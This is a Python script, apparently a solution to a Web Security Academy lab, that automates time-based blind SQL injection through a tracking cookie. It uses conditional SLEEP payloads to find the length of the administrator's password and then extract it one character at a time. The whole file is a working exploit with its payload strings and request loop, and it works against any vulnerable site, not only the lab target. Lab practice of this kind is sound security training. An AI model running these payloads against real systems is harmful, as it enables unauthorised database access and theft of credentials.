import requests
import sys
from urllib.parse import quote_plus
import urllib3
import time

# Disable warnings for unverified HTTPS requests
urllib3.disable_warnings()

# Target URL (replace with the lab's specific URL)
TARGET = "https://0a330079046e2076cbbfcd68008c00a3.web-security-academy.net/"

# SQL injection payload for finding password length
# Uses the 'IF' conditional to delay the response when a match is found
SQLI_LENGTH_STRING = "X' OR IF((SELECT LENGTH(password) FROM users WHERE username='administrator') = {length}, SLEEP(3), 0)--"

# SQL injection payload for extracting each character of the password
# Leverages ASCII values and conditional delay to infer password characters one by one
SQLI_CHAR_STRING = "X' OR IF((SELECT ASCII(SUBSTRING(password, {position}, 1)) FROM users WHERE username='administrator') = {char}, SLEEP(3), 0)--"

# Define proxy settings for interception with tools like Burp Suite
PROXIES = {
    'http': 'http://127.0.0.1:8080'
}

# Cookie template where SQL injection payload will be injected
COOKIES = {
    "TrackingId": "{payload}"
}

# Define character ranges for brute-forcing password
# This range includes digits (0-9) and lowercase letters (a-z)
CHAR_RANGES = list(range(48, 58)) + list(range(97, 123))

# Define a class to handle the blind SQL injection logic
class SQLI:
    def __init__(self, target):
        # Store the target URL
        self.target = target

    # Function to craft the SQL injection query with dynamic parameters
    def craft_query(self, template, **kwargs):
        return template.format(**kwargs)

    # Function to send a GET request with the crafted SQL payload
    # Measures the response time to infer true/false conditions
    def get_request(self, query):
        # Format the cookies with the SQL payload
        cookies = {
            "TrackingId": COOKIES["TrackingId"].format(payload=quote_plus(query))
        }
        # Measure the start time of the request
        start_time = time.time()
        # Send the request with the payload
        resp = requests.get(self.target, allow_redirects=False, proxies=PROXIES, cookies=cookies, verify=False)
        # Calculate the elapsed time
        elapsed_time = time.time() - start_time
        # Return true if the elapsed time indicates a delay (≥ 3 seconds)
        return elapsed_time >= 3

    # Function to determine the length of the administrator's password
    def find_password_length(self):
        for length in range(1, 51):  # Test lengths from 1 to 50
            # Craft the SQL injection payload for length testing
            query = self.craft_query(SQLI_LENGTH_STRING, length=length)
            print(f"Testing length: {length}")  # Debug: Show current length being tested
            if self.get_request(query):  # Check for delay
                print(f"Password length found: {length}")  # Debug: Length found
                return length
        return None  # Return None if length is not found

    # Function to extract the password character by character
    def extract_password(self, length):
        output = ""  # Initialize an empty string to store the password
        for position in range(1, length + 1):  # Iterate over each character position
            for test_val in CHAR_RANGES:  # Iterate over possible character values
                # Print the character being tested for debugging
                sys.stdout.write(chr(test_val))
                sys.stdout.write('\b')  # Erase the character (visual effect for terminal)
                sys.stdout.flush()

                # Craft the SQL injection payload for character testing
                query = self.craft_query(SQLI_CHAR_STRING, position=position, char=test_val)
                if self.get_request(query):  # Check for delay
                    output += chr(test_val)  # Add the matched character to the password
                    break  # Move to the next position once a match is found
        return output  # Return the extracted password


if __name__ == "__main__":
    print("STARTING")  # Debug: Indicate the script has started
    sqli = SQLI(TARGET)  # Create an instance of the SQLI class

    # Step 1: Find the length of the password
    password_length = sqli.find_password_length()
    if not password_length:
        print("Unable to determine password length")  # Debug: Failed to find length
        sys.exit(1)  # Exit the script if length cannot be determined

    # Step 2: Extract the password using the determined length
    password = sqli.extract_password(password_length)
    print(f"Password: {password}")  # Output the extracted password
    print("finished")  # Debug: Indicate the script has finished
